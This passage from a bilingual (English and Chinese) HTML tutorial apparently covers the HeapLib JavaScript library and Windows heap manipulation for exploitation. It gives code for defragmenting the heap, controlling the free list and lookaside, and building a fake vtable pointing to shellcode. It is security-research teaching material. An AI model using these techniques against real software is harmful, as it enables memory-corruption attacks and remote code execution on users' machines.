  9.6pt;margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
  lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'>heap.vtable(shellcode,
  0x4058b5) // generates a 1008 byte vtable<o:p></o:p></span></p>
  <p class=MsoNormal style='margin-top:9.6pt;margin-right:0cm;margin-bottom:
  9.6pt;margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
  lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'><span
  style='mso-spacerun:yes'>              </span><span
  style='mso-spacerun:yes'>                   </span>// with pointers to
  shellcode<o:p></o:p></span></p>
  </div>
  </div>
  </td>
 </tr>
</table>

<h2><span lang=EN-US style='font-size:12.5pt;font-family:Verdana'>Using HeapLib<o:p></o:p></span></h2>

<h2><span style='font-size:12.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>使用</span><span lang=EN-US style='font-size:12.5pt;font-family:Verdana'>HeapLib<o:p></o:p></span></h2>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana'>Putting blocks
on the free list<o:p></o:p></span></h3>

<h3><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>把内存块释放到</span><span lang=EN-US style='font-size:9.5pt;font-family:
Verdana'>free list</span><span style='font-size:9.5pt;mso-ascii-font-family:
Verdana;mso-hansi-font-family:Verdana'>中去（为了表述方便，这一小标题被提前了一点</span><span
lang=EN-US style='font-size:9.5pt;font-family:Wingdings;mso-ascii-font-family:
Verdana;mso-hansi-font-family:Verdana;mso-char-type:symbol;mso-symbol-font-family:
Wingdings'><span style='mso-char-type:symbol;mso-symbol-font-family:Wingdings'>J</span></span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>）</span><span lang=EN-US style='font-size:9.5pt;font-family:Verdana'><o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana'>Assume that we
have a piece of code that allocates a block of memory from the heap and uses it
without initialization. If we control the data in the block, we'll be able to exploit
this vulnerability. We need to allocate a block of the same size, fill it with
our data, and free it. The next allocation for this size will get the block
containing our data.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>假设我们发现了一段有漏洞的代码，这个漏洞是代码从堆中分配一个内存块（大小记为</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana'>N</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>）并且在没有初始化的情况下就使用了堆中的数据（比如把未初始化的数据当成了函数指针</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana'>;</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>））。那么如果我们能预先往这个内存块中写上适当的数据，我们实际上就已经能够利用这个漏洞了。为了能利用这个漏洞，我们需要先分配一个大小同样为</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana'>N</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>的内存块，并且往这个内存块中写入我们的数据，然后释放掉这个内存块，那么下一次，也就是有漏洞的代码要求分配空间时，它就会得到我们刚才分配，写入数据并且释放掉的那个内存块。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana'>The only
obstacle is the coalescing algorithm in the system memory allocator. If the
block we're freeing is next to another free block, they will get coalesced into
a bigger block, and the next allocation might not get a block containing our
data. To prevent this, we will allocate three blocks of the same size, and free
the middle one. Defragmenting the heap beforehand will ensure that the three
blocks are consecutive, and the middle block will not get coalesced.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>但是这一招有时会不太灵，因为如果我们分配的内存块的相邻的一个内存块是一个空闲块的话，当我们释放这个内存块的时候，会引发空闲内存块的合并操作，系统会把这</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana'>2</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>个内存块合并成一个大的内存块。这样下一次有漏洞的代码要求分配空间时，它就不一定会得到我们我们刚才分配到的那个内存块了。为了防止这个问题的发生，我们可以连着分配</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana'>3</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>个大小为</span><span lang=EN-US style='font-size:9.5pt;font-family:Verdana'>N</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>的内存块，然后释放掉中间的那个，这样就能保证与被释放的这个内存块相邻的内存块都不是空闲块。如下面这段代码：</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt'>heap.alloc(0x2020);<span style='mso-spacerun:yes'>             </span>// allocate three consecutive blocks<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt'>heap.alloc(0x2020, &quot;freeList&quot;);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt'>heap.alloc(0x2020);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt'>heap.free(&quot;freeList&quot;);<span style='mso-spacerun:yes'>          </span>// free the middle block<o:p></o:p></span></pre>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana'>Defragmenting
the heap<o:p></o:p></span></h3>

<h3><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>消除堆中的内存碎片</span><span lang=EN-US style='font-size:9.5pt;font-family:
Verdana'><o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana'>Heap
fragmentation is a serious problem for exploitation. If the heap starts out
empty the heap allocator's determinism allows us to compute the heap state
resulting from a specific sequence of allocations. Unfortunately, we don't know
the heap state when our exploit is executed, and this makes the behavior of the
heap allocator unpredictable.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>事实上，上面这段代码也不一定有效（啊哟，谁丢的臭鸡蛋啊？）。问题是堆中可能存在内存碎片。</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana'><o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>如果在我们的</span><span lang=EN-US style='font-size:9.5pt;font-family:Verdana'>exploitation</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>运行之初，堆是“干净的”，也就是说在我们的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana'>exploitation</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>运行之前，还没有程序使用过堆中的内存空间，我们就可以严格控制堆中的状态，也就是能保证上面提到的连续分配的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana'>3</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>个大小为</span><span lang=EN-US style='font-size:9.5pt;font-family:Verdana'>N</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>的内存块是<b style='mso-bidi-font-weight:normal'>紧紧相连</b>的。但是事实上，我们不知道在我们的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana'>exploitation</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>运行之前，堆是不是“干净的”，这就使我们基本上无法确定堆中内存的分配函数（比如</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana'>HeapAlloc()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>）究竟会分配那块内存给我们。</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana'>To deal with
this problem, we need to defragment the heap. This can be accomplished by
allocating a large number of blocks of the size that our exploit will use.
These blocks will fill all available holes on the heap and guarantee that any
subsequent allocations for blocks of the same size are allocated from the end
of the heap. At this point the behavior of the allocator will be equivalent to
starting with an empty heap.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>这话怎么说呢？因为如果堆中有内存碎片，这个内存碎片又恰好等于或者大于</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana'>N</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>，那么我们第一次申请分配一个大小为</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana'>N</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>的内存块时，会直接分配到这个内存碎片。这样我们就不能保证连续分配的</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana'>3</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>个大小为</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana'>N</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>的内存块是<b style='mso-bidi-font-weight:normal'>紧紧相连</b>的。如果堆中有多个恰好等于或者大于</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana'>N</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>的内存碎片又会怎样呢</span><span lang=EN-US style='font-size:9.5pt;font-family:
Verdana'>……<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>为了对付这个问题，我们需要消除堆中的内存碎片。假设堆中有</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana'>X</span><span style='font-size:9.5pt;mso-ascii-font-family:
Verdana;mso-hansi-font-family:Verdana'>个等于或者大于</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana'>N</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>的内存碎片，我们可以通过预先分配</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana'>X</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>个或者多于</span><span lang=EN-US style='font-size:9.5pt;font-family:Verdana'>X</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>个大小为</span><span lang=EN-US style='font-size:9.5pt;font-family:Verdana'>N</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>的内存块来消除这些内存碎片的影响。当然我们不可能知道这个</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana'>X</span><span style='font-size:9.5pt;mso-ascii-font-family:
Verdana;mso-hansi-font-family:Verdana'>是几，但是我们可以假定这个</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana'>X</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>是一个比较大的数，通过分配很多个大小为</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana'>N</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>的内存块来达到消除内存碎片的目的。（反正多分配几个内存块不会坏什么事</span><span lang=EN-US
style='font-size:9.5pt;font-family:Wingdings;mso-ascii-font-family:Verdana;
mso-hansi-font-family:Verdana;mso-char-type:symbol;mso-symbol-font-family:Wingdings'><span
style='mso-char-type:symbol;mso-symbol-font-family:Wingdings'>J</span></span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>）</span><span style='font-size:9.5pt;font-family:Verdana'> <span
lang=EN-US><o:p></o:p></span></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana'>The following
code will defragment the heap with blocks of size 0x2010 bytes:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>下面是一段示例代码，我们设</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana'>N==0x2010:<o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt'>for (var i = 0; i &lt; 1000; i++)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt'><span style='mso-spacerun:yes'>    </span>heap.alloc(0x2010);<o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana'>The HeapLib
library provides a convenience function that implements the technique described
above. The following example shows how to add 0x2020 byte block to the free
list:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>在</span><span lang=EN-US style='font-size:9.5pt;font-family:Verdana'>HeapLib</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>中提供了一个</span><span lang=EN-US style='font-size:9.5pt;font-family:Verdana'>freelist()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>函数，这个函数把刚才我们讨论的这两个技术给封装了起来，你只要调用这个函数就能轻松的完成上面</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana'>2</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>个小标题中我们需要完成的任务了。下面是把一个大小为</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana'>0x2020</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>的内存块释放到</span><span lang=EN-US style='font-size:9.5pt;font-family:
Verdana'>freelist</span><span style='font-size:9.5pt;mso-ascii-font-family:
Verdana;mso-hansi-font-family:Verdana'>中去的代码。（译注：实际上还要考虑</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana'>lookaside</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>，详见下面的讨论）</span><span lang=EN-US style='font-size:9.5pt;font-family:
Verdana'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>heap.freeList(0x2020);<o:p></o:p></span></pre>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Emptying
the lookaside<o:p></o:p></span></h3>

<h3><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>清空</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>Lookaside</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>表</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>To
empty the lookaside list for a certain size, we just need to allocate enough
blocks of that size. Usually the lookaside will contain no more than 4 blocks,
but we've seen lookasides with more entries on XP SP2. We'll allocate 100
blocks, just to be sure. The following code shows this:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>要清空</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>lookaside</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>表中的某一项还是比较简单的，一般情况下，</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>lookaside</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>表中每一个项中只能容纳</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>4</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>个内存块，但是我曾经在</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>XP SP2</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>环境下见过</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>lookaside</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>表中一个项中包含超过</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>4</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个内存块的情况，所以我还是保险一点，连续分配</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>100</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个大小合适的内存块来清空</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>lookaside</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>表，下面是示例代码：</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>for (var i = 0; i &lt; 100; i++)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>heap.alloc(0x100);<o:p></o:p></span></pre>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Freeing
to the lookaside<o:p></o:p></span></h3>

<h3><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>把内存块释放到</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>lookaside</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>表中去</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Once
the lookaside is empty, any block of the right size will be put on the
lookaside when we free it.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>一旦</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>lookaside</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>表中的某一项被清空了，那么我们一旦释放一个大小合适的内存块的话，这个内存块就会被放到</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>lookaside</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>表中去。</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>// Empty the lookaside<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>for (var i = 0; i &lt; 100; i++)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>heap.alloc(0x100);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>// Allocate a block<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>heap.alloc(0x100, &quot;foo&quot;);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>// Free it to the lookaside<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>heap.free(&quot;foo&quot;);<o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
lookaside() function in HeapLib implements this technique:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>在</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>HeapLib</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>中提供了一个名为</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>lookaside()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的函数实现该功能。</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>// Empty the lookaside<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>for (var i = 0; i &lt; 100; i++)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>heap.alloc(0x100);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>// Add 3 blocks to the lookaside<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>heap.lookaside(0x100);<o:p></o:p></span></pre>

<h3><a name=vtable></a><span lang=EN-US style='font-size:9.5pt;font-family:
Verdana;color:#404040'>Using the lookaside for object pointer exploitation<o:p></o:p></span></h3>

<h3><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>使用</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>lookaside</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>伪造对象的虚函数表</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>It
is interesting to follow what happens when a block is put on the lookaside.
Let's start with an empty lookaside list. If the base of the heap is 0x150000,
the address of the lookaside head for blocks of size 1008 will be 0x151e58.
Since the lookaside is empty, this location will contain a NULL pointer.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>我之所以这么关心</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>lookaside</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>表是有原因的。我们先从一个空的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>lookaside</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>表讲起，我们设堆的基地址是</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>0x150000</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>，那么与大小为</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>1008</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>字节的内存块对应的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>lookaside</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>表项就应该位于</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x151e58</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>。我已经说了现在假设</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>lookaside</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>表是空的，所以</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x151e58</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>这个位置上应该是一个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>NULL</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>指针。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Now
let's free a 1008 byte block. The lookaside head at 0x151e58 will point to it,
and the first four bytes of the block will be overwritten with a NULL to
indicate the end of the linked list. The structure in memory looks just like
what we need to exploit an overwritten object pointer:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>现在，如果我释放一个大小为</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>1008</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>字节的内存块，由于</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>lookaside</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>表示空的，所以这个内存块就直接进入</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>lookaside</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>表了。进了</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>lookaside</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>表之后，我们释放的这个内存块的第一个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>DWORD</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>就变成一个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>NULL</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>了（表示这个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>lookaside</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>链表结尾）。如下图所示，现在我们只要找个对象，把它的虚函数表改成</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x151e58</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>就齐活了</span><span lang=EN-US style='font-size:9.5pt;
font-family:Wingdings;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;
color:#404040;mso-char-type:symbol;mso-symbol-font-family:Wingdings'><span
style='mso-char-type:symbol;mso-symbol-font-family:Wingdings'>J</span></span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'> <o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>object pointer<span style='mso-spacerun:yes'>   </span>--&gt;<span style='mso-spacerun:yes'>   </span>lookaside<span style='mso-spacerun:yes'>     </span>--&gt;<span style='mso-spacerun:yes'>   </span>freed block<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>                       </span>(fake object)<span style='mso-spacerun:yes'>       </span>(fake vtable)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>addr: xxxx<span style='mso-spacerun:yes'>             </span>addr: 0x151e58<span style='mso-spacerun:yes'>      </span>addr: yyyy<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>data: 0x151e58<span style='mso-spacerun:yes'>         </span>data: yyyy<span style='mso-spacerun:yes'>          </span>data: +0 NULL<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>                                                 </span>+4 function pointer<o:p></o:p></span></pre><pre
